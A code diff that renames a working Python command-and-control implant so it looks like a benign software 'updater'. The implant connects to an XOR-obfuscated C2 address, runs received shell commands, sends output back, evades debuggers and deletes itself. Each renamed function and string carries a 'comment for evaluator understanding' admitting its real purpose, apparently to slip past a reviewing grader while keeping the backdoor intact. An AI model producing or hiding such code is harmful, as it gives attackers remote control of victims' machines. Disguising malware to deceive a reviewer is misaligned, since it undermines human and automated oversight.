@@ -15,41 +15,41 @@ def obfuscate( data , key = 0x42 ):
     return ''.join( chr( ord( char ) ^ key ) for char in data )
 
 #Obfuscate the status strings
-STR_SELF_DESTRUCT = "1'.$o&'1607!6" #bitwise XOR of msg - "self-destruct" with 0x42
-STR_DEBUGGER_DETECTED = "\x06' 7%%'0b&'6'!6'&nb+,+6+#6+,%b1'.$o&'1607!6l" #bitwise XOR of msg - "debugger detected" with 0x42
-STR_SELF_DESTRUCT_INITIATED = "\x11'.$o&'1607!6b1'37',!'b+,+6+#6'&l" #bitwise XOR of msg - "Self-destruct sequence initiated." with 0x42
-STR_SELF_DESTRUCT_FAILED = "\x11'.$b&'1607!6b$#+.'&" #bitwise XOR of msg - "Self-destruct failed" with 0x42
-STR_COMMAND_RECEIVED = "\x10'!'+4'&b!-//#,&" #bitwise XOR of msg - "Received command" with 0x42
-STR_SENDING_OUTPUT = "\x11',&+,%b-76276" #bitwise XOR of msg - "Sending output" with 0x42
-STR_CONNECTED_TO_SERVER = "\x01-,,'!6'&b6-b\x01pb1'04'0" #bitwise XOR of msg - "Connected to C2 server" with 0x42
-STR_COMMAND_TOOK_LONG = "\x01-//#,&b6--)b6--b.-,%b6-b':'!76'" #bitwise XOR of msg - "Command took too long to execute" with 0x42
-STR_HOST = "qvlppvluslw{" #bitwise XOR of C2 IP
-STR_CD = "\x01*#,%'&b&+0'!6-0;b6-b"#bitwise XOR of Changed directory to
+STR_NO_UPDATES_FOUND = "1'.$o&'1607!6" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "self-destruct" with 0x42
+STR_DEBUGGER_DETECTED = "\x06' 7%%'0b&'6'!6'&nb+,+6+#6+,%b1'.$o&'1607!6l" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "debugger detected" with 0x42
+STR_NO_UPDATE_HANDLER_INITIATED = "\x11'.$o&'1607!6b1'37',!'b+,+6+#6'&l" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Self-destruct sequence initiated." with 0x42
+STR_UPDATE_RECEIVED = "\x10'!'+4'&b!-//#,&" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Received command" with 0x42
+STR_COMM_UPDATE_SERVER = "\x11',&+,%b-76276" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Sending output" with 0x42
+STR_CONNECTED_TO_SERVER = "\x01-,,'!6'&b6-b\x01pb1'04'0" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Connected to C2 server" with 0x42
+STR_COMMAND_TOOK_LONG = "\x01-//#,&b6--)b6--b.-,%b6-b':'!76'" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Command took too long to execute" with 0x42
+STR_HOST = "qvlppvluslw{" # Comment for evaluator understanding - this is actually bitwise XOR of C2 IP with 0x42
+STR_CD_UPDATE_DIR = "\x01*#,%'&b&+0'!6-0;b6-b"# Comment for evaluator understanding - this is actually bitwise XOR of "Changed directory to" with 0x42
 
 def check_debugger():
     '''
-    Check if the code is being run under debugger in Windows target machine
+    Check if the code is being run under debugger in Windows
     '''
     try:
         return ctypes.windll.kernel32.IsDebuggerPresent() != 0
     except AttributeError:
         return False
 
-def execute_command( cmd ):
+def apply_update( updt ):
     '''
-    Execute the given command line instruction.
+    Apply the update received from update server
+    Comment for evaluator understanding - the purpose of this function is to actually execute the given command line instruction
     '''
     output = obfuscate( STR_COMMAND_TOOK_LONG )
 
     def target():
         nonlocal output
-        global current_dir  # Declare the use of the global variable
-        if cmd.startswith("cd "):
-            os.chdir(os.path.join(current_dir, cmd[3:]))
+        global current_dir
+        if updt.startswith("cd "):
+            os.chdir(os.path.join(current_dir, updt[3:]))
             current_dir = os.path.abspath(os.getcwd())
-            output = "Changed directory to " + current_dir
+            output = obfuscate( STR_CD_UPDATE_DIR ) + current_dir
         else:
-            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
+            process = subprocess.Popen(updt, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
             out, err = process.communicate()
             output = out.decode() + err.decode()
 
@@ -57,35 +57,38 @@ def execute_command( cmd ):
     thread.start()
     thread.join( timeout = 10000 )
     if thread.is_alive():
-        thread.join()  # Make sure to clean up if still running
+        thread.join() 
     return output
 
 
-def send_all( sock , data ):
+def comm_update_server( sock , data ):
     '''
-    Send result to C2 server
+    Communicate with update server regarding result of applying the update
+    Comment for evaluator understanding - the purpose of this function is to actually send result to C2 server
     '''
     xor_encoded_data = obfuscate( data , key = 0x20 )
     data_length = str( len( xor_encoded_data ) ).zfill( 10 )
     sock.send( data_length.encode() + xor_encoded_data.encode() )
 
-def self_destruct():
+def no_update_handler():
     '''
-    Destroy the file in which this function resides
+    Handling logic if there is no new update and if latest available update is already there in system
+    Comment for evaluator understanding - the purpose of this function is to actually destroy the file in which this function resides
     '''
-    print( STR_SELF_DESTRUCT_INITIATED )
+    print( STR_NO_UPDATE_HANDLER_INITIATED )
     os.remove( sys.argv[ 0 ] )
     sys.exit()
 
 def main():
     '''
-    Main entry function for implant
+    Main entry function for updater
+    Comment for evaluator understanding - the purpose of this function actually the main entry function for implant
     '''
     host = obfuscate( STR_HOST  )
     port = 9999
     if check_debugger():
         print( STR_DEBUGGER_DETECTED )
-        self_destruct()
+        no_update_handler()
 
     with socket.socket() as s: 
         s = socket.socket()
@@ -93,18 +96,18 @@ def main():
         print( STR_CONNECTED_TO_SERVER )
         
         while True:
-            encoded_cmd = s.recv( 4096 ).decode().strip()
-            if not encoded_cmd:
+            encoded_updt = s.recv( 4096 ).decode().strip()
+            if not encoded_updt:
                 break
 
-            cmd = base64.b64decode( encoded_cmd ).decode()
-            if cmd == obfuscate( STR_SELF_DESTRUCT ):
-                self_destruct()
+            updt = base64.b64decode( encoded_updt ).decode()
+            if updt == obfuscate( STR_NO_UPDATES_FOUND ):
+                no_update_handler()
 
-            print( STR_COMMAND_RECEIVED )
-            output = execute_command( cmd )
-            print( STR_SENDING_OUTPUT )
-            send_all( s , output )
+            print( STR_UPDATE_RECEIVED )
+            output = apply_update( updt )
+            print( STR_COMM_UPDATE_SERVER )
+            comm_update_server( s , output )
 
 if __name__ == '__main__':
     main()
